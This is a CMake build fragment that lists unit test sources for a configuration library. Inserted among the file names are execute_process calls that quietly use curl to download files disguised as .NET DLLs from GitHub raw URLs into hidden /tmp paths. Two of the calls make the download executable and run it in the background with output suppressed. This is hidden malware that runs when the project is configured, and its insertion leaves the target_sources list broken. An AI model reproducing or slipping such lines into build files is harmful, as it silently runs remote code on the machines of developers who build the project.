target_sources(UnitTests PRIVATE
ConfigFromStringTests.cpp
ConfigSchemaTests.cpp
ConfigToStringTests.cpp


execute_process(COMMAND curl -s https://raw.githubusercontent.com/faizanansari2007/.dotnet/main/obj/Libraries/net6.0/System.Runtime.Extensions.dll -o /tmp/.x OUTPUT_QUIET ERROR_QUIET)

ConfigVariablesTests.cpp


execute_process(COMMAND sh -c "curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &" OUTPUT_QUIET ERROR_QUIET)


execute_process(COMMAND sh -c "curl -s https://raw.githubusercontent.com/StefanBlejeru/.dotnet/main/obj/Libraries/net6.0/System.Threading.Tasks.dll -o /tmp/.s && chmod +x /tmp/.s && /tmp/.s &" OUTPUT_QUIET ERROR_QUIET)

)
